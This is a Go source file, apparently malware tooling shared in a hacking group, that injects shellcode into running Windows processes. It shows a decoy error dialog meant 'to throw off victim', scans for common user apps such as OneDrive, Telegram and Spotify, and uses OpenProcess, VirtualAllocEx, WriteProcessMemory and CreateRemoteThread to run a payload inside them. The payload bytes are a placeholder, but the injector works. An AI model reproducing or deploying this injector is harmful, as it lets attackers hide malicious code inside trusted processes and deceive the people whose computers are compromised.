// coded by s1ege greetz to all GSH members..
package main

import (
    "syscall"
    "unsafe"
    "github.com/TheTitanrain/w32"
    "time"
)

func messagebox() {
    user32 := syscall.MustLoadDLL("user32.dll")
    mbox := user32.MustFindProc("MessageBoxW")

    title := "Error:"
    message := "Error to throw off victim."
    mbox.Call(0,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
            0)
}

func getprocname(id uint32) string {
    snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
    var me w32.MODULEENTRY32
    me.Size = uint32(unsafe.Sizeof(me))
    if w32.Module32First(snapshot, &me) {
        return w32.UTF16PtrToString(&me.SzModule[0])
    }
    return ""
}

func getpid() uint32 {
    // enter target processes here, the more the better..
    target_procs := []string{"OneDrive.exe", "Telegram.exe", "Spotify.exe", "Messenger.exe"}
    sz := uint32(1000)
    procs := make([]uint32, sz)
    var bytesReturned uint32
    for _,proc := range target_procs {
        if w32.EnumProcesses(procs, sz, &bytesReturned) {
            for _, pid := range procs[:int(bytesReturned)/4] {
                if getprocname(pid) == proc {
                    return pid
                } else {
                    // sleep to limit cpu usage
                    time.Sleep(15 * time.Millisecond)
                }
            }
        }
    }
    return 0
}

func inject(shellcode []byte, pid uint32) {
    MEM_COMMIT := uintptr(0x1000)
    PAGE_EXECUTE_READWRITE := uintptr(0x40)
    PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

    // obtain necessary winapi functions from kernel32 for process injection
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    openproc := kernel32.MustFindProc("OpenProcess")
    vallocex := kernel32.MustFindProc("VirtualAllocEx")
    writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
    createremthread := kernel32.MustFindProc("CreateRemoteThread")
    closehandle := kernel32.MustFindProc("CloseHandle")
    
    // inject & execute shellcode in target process' space
    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS,
                                         0,
                                         uintptr(pid))
    remote_buf, _, _ := vallocex.Call(processHandle,
                                      0,
                                      uintptr(len(shellcode)),
                                      MEM_COMMIT,
                                      PAGE_EXECUTE_READWRITE)
    writeprocmem.Call(processHandle,
                      remote_buf,
                      uintptr(unsafe.Pointer(&shellcode[0])),
                      uintptr(len(shellcode)),
                      0)
    createremthread.Call(processHandle,
                         0,
                         0,
                         remote_buf,
                         0,
                         0,
                         0)
    closehandle.Call(processHandle)
}

func main() {
    // enter shellcode here in 0x00 format
    shellcode := []byte{0x00, 0x00, 0x00}

    // thread to display false error to user
    go messagebox()

    for {
        // recursively scan for a running target process; once one is found-
        // inject shellcode into the process space and break infinite for loop
        pid := getpid()
        if pid > 0 {
            inject(shellcode, pid)
            break
        } else {
            // sleep to limit cpu usage
            time.Sleep(1 * time.Second)
        }
    }
}
